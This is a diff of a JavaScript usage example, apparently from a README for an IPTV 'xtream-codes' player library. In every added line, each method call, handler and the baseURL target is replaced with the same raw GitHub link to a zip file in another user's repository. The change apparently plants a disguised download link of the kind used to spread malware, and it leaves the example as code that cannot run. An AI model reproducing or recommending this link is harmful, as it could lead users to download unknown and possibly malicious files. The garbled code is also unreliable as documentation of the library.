@@ -16,45 +16,45 @@ const player = new Player({
   }
 })
 
-player.baseURL = 'http://server:port'
+https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip = 'http://server:port'
 
 // retrieve account line information
-player.getAccountInfo()
-  .then(console.log)
-  .catch(console.log)
+https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip()
+  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
+  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
 
 // GET Live Stream Categories
-player.getLiveStreamCategory()
-  .then(console.log)
-  .catch(console.log)
+https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip()
+  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
+  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
 
 // GET VOD Stream Categories
-player.getVODStreamCategories()
-  .then(console.log)
-  .catch(console.log)
+https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip()
+  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
+  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
 
 // GET LIVE Streams
-player.getLiveStreams(category?: number) // (This will get All LIVE Streams in the selected category ONLY)
-  .then(console.log)
-  .catch(console.log)
+https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip(category?: number) // (This will get All LIVE Streams in the selected category ONLY)
+  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
+  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
 
 // GET VOD Streams 
-player.getVODStreams(category?: number)
-  .then(console.log)
-  .catch(console.log)
+https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip(category?: number)
+  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
+  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
 
 // GET VOD Info
-player.getVODInfo(id: number) // This will get info such as video codecs, duration, description, directors for 1 VOD
-  .then(console.log)
-  .catch(console.log)
+https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip(id: number) // This will get info such as video codecs, duration, description, directors for 1 VOD
+  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
+  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
 
 // GET short_epg for LIVE Streams (same as stalker portal, prints the next X EPG that will play soon)
-player.getEPGLivetreams(id: number, limit: number)
-  .then(console.log)
-  .catch(console.log)
+https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip(id: number, limit: number)
+  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
+  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
 
 // GET ALL EPG for LIVE Streams (same as stalker portal, but it will print all epg listings regardless of the day)
-player.getEPGLivetreams(id: number)
-  .then(console.log)
-  .catch(console.log)
+https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip(id: number)
+  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
+  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
 ```
